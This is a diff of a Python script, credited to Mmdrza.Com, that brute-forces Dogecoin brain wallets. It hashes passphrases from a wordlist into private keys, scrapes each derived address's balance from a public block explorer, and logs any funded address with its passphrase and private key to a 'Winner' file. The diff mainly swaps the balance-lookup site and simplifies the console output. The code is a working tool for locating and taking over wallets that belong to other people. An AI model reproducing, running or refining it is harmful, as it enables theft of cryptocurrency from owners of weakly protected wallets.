@@ -7,11 +7,9 @@
 #   Programmer Mmdrza.Com ~ Telegram Channel @mPython3 ~ ID Telegram @PyMmdrza ~ https://Mmdrza.Com      #
 ##########################################################################################################
 
-
 import codecs
 import hashlib
 import threading
-import time
 
 import ecdsa
 import requests
@@ -20,37 +18,15 @@ from hdwallet.symbols import DOGE as SYMBOL
 from requests_html import HTMLSession
 from rich.console import Console
 from rich.panel import Panel
-import os
-
-
-class Color():
-    Red = '\33[31m'
-    Green = '\33[32m'
-    Yellow = '\33[33m'
-    Blue = '\33[34m'
-    Magenta = '\33[35m'
-    Cyan = '\33[36m'
-    White = '\33[37m'
-    Grey = '\33[2m'
-    Reset = '\033[0m'
-
-
-red = Color.Red
-green = Color.Green
-yellow = Color.Yellow
-magenta = Color.Magenta
-cyan = Color.Cyan
-res = Color.Reset
 
 console = Console()
 console.clear()
 
-filexname = input(
-    '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n [*] INSERT HERE File Name <---------|Without type file .txt|:::::::: ')
+filer = input('\n[*] Just Enter the Desired Text File Name [HERE] : ')
 
 mylist = []
 
-filename = str(filexname + ".txt")
+filename = str(filer + ".txt")
 with open(filename, newline='', encoding='utf-8') as f:
     for line in f:
         mylist.append(line.strip())
@@ -123,18 +99,11 @@ class BrainWallet:
         return b58_string
 
 
-def bald(str):
-    link = f"https://dogecoin.atomicwallet.io/address/{str}"
-    session = HTMLSession()
-    response = session.get(link).html.xpath('/html/body/main/div/div[2]/div[1]/table/tbody/tr[4]/td[2]')
-    return response[0].text
-
-
 def MmDrza():
     w = 0
     count = 0
 
-    for i in range(0, len(mylist)):
+    for i in range(len(mylist)):
         count += 1
         passphrase = mylist[i]
         wallet = BrainWallet()
@@ -142,39 +111,42 @@ def MmDrza():
         hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
         hdwallet.from_private_key(private_key=private_key)
         addr = hdwallet.p2pkh_address()
-        bal = bald(addr)
+        url_n = f"https://doge2.trezor.io/address/{addr}"
+        se = HTMLSession()
+        nmp = se.get(url_n)
+        Master = nmp.html.xpath('/html/body/main/div/div[2]/div[1]/table/tbody/tr[3]/td[2]')
+        bal = Master[0].text
 
-        MmdrzaPanel = str(
-            '[gold1 on grey15]Total Checked: ' + '[orange_red1]' + str(
-                count) + '[/][gold1 on grey15] ' + ' Win:' + '[white]' + str(w) + '[/][gold1]  BAL:[aquamarine1]' + str(
-                bal) + '\n[/][gold1 on grey15]Addr: ' + '[white] ' + str(
-                address) + '[gold1 on grey15]                  Passphrase: ' + '[orange_red1]' + str(
-                passphrase) + '[/]\nPRIVATEKEY: [grey54]' + str(private_key) + '[/]')
+        ifxbtc = '0 DOGE'
+        MmdrzaPanel = str('[gold1 on grey15]Total Checked: ' + '[orange_red1]' + str(
+            count) + '[/][gold1 on grey15] ' + ' Win:' + '[white]' + str(w) + '[/][gold1]  BAL:[aquamarine1]' + str(
+            bal) + '\n[/][gold1 on grey15]Addr: ' + '[white] ' + str(
+            address) + '[gold1 on grey15]                  Passphrase: ' + '[orange_red1]' + str(
+            passphrase) + '[/]\nPRIVATEKEY: [grey54]' + str(private_key) + '[/]')
         style = "gold1 on grey11"
-        stylez = "green on grey11"
-        if int(bal) > 0:
-            fx = open(u"DogeWinner_________" + str(filexname) + "_MMDRZA.txt", "a")
+        if bal != ifxbtc:
+            fx = open(u"BitcoinWinner_________" + str(filer) + "_MMDRZA.txt", "a")
             fx.write('\nAddress Compressed : ' + addr + '  Bal = ' + str(bal))
             fx.write('\nPassphrase       : ' + passphrase)
             fx.write('\nPrivate Key      : ' + private_key)
             fx.write('\nBalance: ' + str(bal))
-            fx.write('\n-------------- Programmer Mmdrza.Com ----------------------\n')
+            fx.write('\n------------------ Programmer Mmdrza.Com ----------------------\n')
             fx.close()
             console.print(
                 Panel(str(MmdrzaPanel), title="[white]Win Wallet [/]", subtitle="[green_yellow blink] Mmdrza.Com [/]",
                       style="red"), style=style, justify="full")
             w += 1
         else:
-            tt = time.ctime()
-            print(
-                f"{cyan}[{tt[11:]}]{res}{yellow} {count}{res}{red} -{res}{green} Found:{w}{res}{magenta} #{res}{red} Addr:{res}{yellow}{addr} {res}{magenta}~{res}{red} Tx:{res}{cyan}{bal}{res} {red}Passphrase:{res}{passphrase}")
+            print(f"{count} - Found:{w} # Addr: {addr} ~ Value:{bal} #Passphrase: {passphrase}")
+            continue
 
 
 MmDrza()
 
-thr = threading.Thread(target=MmDrza)
-thr.start()
-thr.join()
+if __name__ == "__main__":
+    Master = threading.Thread(target=MmDrza)
+    Master.start()
+    Master.join()
 
 # =====================================================
 # DONATE (BTC) : 16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8
